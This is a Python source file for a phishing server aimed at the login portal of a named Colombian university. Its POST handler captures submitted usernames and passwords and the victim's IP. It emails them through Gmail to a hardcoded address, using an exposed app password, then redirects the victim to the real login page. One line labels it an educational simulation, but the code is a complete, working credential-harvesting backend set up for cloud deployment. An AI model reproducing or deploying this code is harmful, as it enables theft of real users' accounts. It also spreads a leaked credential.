import http.server
import urllib.parse
import datetime
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# CONFIGURACION PARA NOTIFICACIONES (Donde quieres recibir las credenciales capturadas)
CORREO_NOTIFICACION = "marlonmoncayo7474@gmail.com"
PASSWORD_NOTIFICACION = "jpwy hpdh lnuy tpaw"  # Tu contraseña de aplicación de Gmail

def enviar_alerta_correo(usuario, clave, ip, fecha):
    try:
        msg = MIMEMultipart("alternative")
        msg['Subject'] = "🚨 ¡Nuevas credenciales capturadas en SIGEDIN!"
        msg['From'] = CORREO_NOTIFICACION
        msg['To'] = CORREO_NOTIFICACION

        cuerpo = f"""
        <html>
          <body style="font-family: Arial, sans-serif; color: #1f2937;">
            <h2 style="color: #d97706;">¡Credenciales capturadas con exito!</h2>
            <p><strong>Fecha y Hora:</strong> {fecha}</p>
            <p><strong>IP de la víctima:</strong> {ip}</p>
            <hr>
            <p><strong>Usuario / Documento:</strong> <span style="color: #dc2626; font-size: 16px;">{usuario}</span></p>
            <p><strong>Contraseña capturada:</strong> <span style="color: #dc2626; font-size: 16px;">{clave}</span></p>
            <hr>
            <p><em>Simulación educativa de Phishing - Institución Universitaria del Putumayo</em></p>
          </body>
        </html>
        """
        msg.attach(MIMEText(cuerpo, 'html', 'utf-8'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(CORREO_NOTIFICACION, PASSWORD_NOTIFICACION)
        server.sendmail(CORREO_NOTIFICACION, CORREO_NOTIFICACION, msg.as_string())
        server.quit()
        print("[+] Alerta de credenciales enviada por correo exitosamente.")
    except Exception as e:
        print(f"[-] Error al enviar la alerta por correo: {e}")

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        super().end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = urllib.parse.parse_qs(post_data)
        
        usuario = params.get('usuario', [''])[0]
        clave = params.get('clave', [''])[0]
        
        # Obtener la IP real de la víctima a través de los encabezados de Render
        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n[¡ALERTA! CREDENCIALES CAPTURADAS] Usuario: {usuario} | Clave: {clave} | IP: {ip}")
        
        # Enviar correo de notificación automático a ti
        enviar_alerta_correo(usuario, clave, ip, fecha)
        
        # Redirigir a la víctima al sitio real de la universidad
        self.send_response(302)
        self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
        self.end_headers()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8000))
    server_address = ('0.0.0.0', port)
    httpd = http.server.HTTPServer(server_address, PhishingHandler)
    print(f"==================================================")
    print(f" SERVIDOR EN LA NUBE (RENDER) ACTIVO EN PUERTO {port}")
    print(f"==================================================")
    httpd.serve_forever()